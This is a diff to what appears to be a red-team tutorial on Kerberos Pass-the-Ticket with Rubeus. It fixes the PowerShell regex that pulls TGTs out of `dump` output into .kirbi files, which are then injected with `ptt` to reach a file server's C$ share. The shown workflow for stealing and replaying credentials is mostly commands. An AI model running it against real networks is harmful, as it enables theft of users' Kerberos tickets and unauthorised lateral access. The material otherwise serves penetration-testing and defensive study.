@@ -91,11 +91,32 @@ After reviewing `triage`, target the relevant LUID:
 ```powershell
 $raw = .\Rubeus.exe dump /luid:0x777062 /service:krbtgt /nowrap | Out-String
 
-$b64 = [regex]::Match($raw, '[A-Za-z0-9+/=]{100,}').Value
+$pattern = '(?s)Base64EncodedTicket\s*:\s*\r?\n\r?\n\s*([A-Za-z0-9+/=]{100,})'
+$b64 = [regex]::Match($raw, $pattern).Groups[1].Value
 if ($b64) {
     [IO.File]::WriteAllBytes('C:\Temp\tgt_0x777062.kirbi', [Convert]::FromBase64String($b64))
 }
 ```
+
+> **Pitfall:** `dump` output also prints a `Base64(key)` field (the ticket's session key)
+> immediately *before* `Base64EncodedTicket`, and that key value is itself 100+ Base64
+> characters long:
+>
+> ```text
+> KeyType                  :  aes256_gcm_ghash_credguard
+> Base64(key)              :  V1JBUAMAAAASAAAAqwAAAAAAAAAXAAAAZAAAAAEAAAABAQAA...
+> Base64EncodedTicket   :
+>
+>       doIGpTCCBqGgAwIBBaEDAgEWooIE+jCCBPZhggTy...
+> ```
+>
+> A naive `[regex]::Match($raw, '[A-Za-z0-9+/=]{100,}')` (no label anchor) matches the
+> **first** run of 100+ Base64 characters in the text — the session key, not the ticket —
+> and silently writes an invalid `.kirbi` file (it decodes fine, but the bytes are a key
+> blob, not an ASN.1 `KRB-CRED` structure, so `ptt` fails to inject it). Always anchor the
+> regex on the `Base64EncodedTicket` label as shown above; a valid ticket blob decodes to
+> bytes starting with `doIG` (the DER `KRB-CRED` sequence tag), which is a good sanity
+> check while debugging extraction scripts.
 
 This approach works for one ticket; run it once per LUID and service. See the conversion script below for every ticket in one pass.
 
@@ -120,12 +141,15 @@ This is useful for collection, but the output is Base64 text rather than ready-t
 ```powershell
 $raw = .\Rubeus.exe dump /nowrap | Out-String
 
-$matches = [regex]::Matches($raw, '(?m)^[A-Za-z0-9+/]{100,}={0,2}$')
+# Anchored on the "Base64EncodedTicket" label (see the pitfall note above) so each match
+# is an actual ticket, not a "Base64(key)" session key value.
+$pattern = '(?s)Base64EncodedTicket\s*:\s*\r?\n\r?\n\s*([A-Za-z0-9+/=]{100,})'
+$matches = [regex]::Matches($raw, $pattern)
 
 $i = 0
 foreach ($m in $matches) {
     $i++
-    $b64 = $m.Value.Trim()
+    $b64 = $m.Groups[1].Value
     $bytes = [Convert]::FromBase64String($b64)
     [IO.File]::WriteAllBytes("C:\Temp\ticket_$i.kirbi", $bytes)
 }
@@ -221,7 +245,8 @@ Access succeeds only if the account associated with the ticket has the required 
 
 # 2. Extract a TGT from a selected LUID and decode the Base64 blob into a .kirbi file
 $raw = .\Rubeus.exe dump /luid:0x777062 /service:krbtgt /nowrap | Out-String
-$b64 = [regex]::Match($raw, '[A-Za-z0-9+/=]{100,}').Value
+$pattern = '(?s)Base64EncodedTicket\s*:\s*\r?\n\r?\n\s*([A-Za-z0-9+/=]{100,})'
+$b64 = [regex]::Match($raw, $pattern).Groups[1].Value
 [IO.File]::WriteAllBytes('C:\Temp\tgt.kirbi', [Convert]::FromBase64String($b64))
 
 # 3. Inject the TGT into the current session
@@ -242,6 +267,7 @@ dir \\fileserver.corp.local\c$
 - Use `/service:krbtgt` to extract TGTs.
 - Use `/nowrap` for single-line Base64 output.
 - `dump` has no `/outfile` switch; decode the Base64 blob into a `.kirbi` file yourself.
+- When extracting that blob with a regex, anchor on the `Base64EncodedTicket` label — `dump` also prints a `Base64(key)` field just before it that is itself 100+ Base64 characters long and will be matched instead by an unanchored pattern.
 - Use `ptt` to inject a ticket.
 - Use `asktgs` to request service tickets using a TGT; `asktgs` supports `/outfile`.
 - A valid TGT enables further ticket requests; a service ticket is bound to one service.
@@ -254,3 +280,4 @@ dir \\fileserver.corp.local\c$
 - Expired tickets cannot be used for PtT.
 - Injecting into another LUID requires elevated context.
 - Rubeus can output all tickets as Base64, but exporting every ticket as an individual `.kirbi` file requires post-processing.
+- An unanchored Base64 regex can silently extract the `Base64(key)` field instead of the ticket; the result still decodes as valid bytes, so the mistake only surfaces later when `ptt` fails to inject the "ticket".
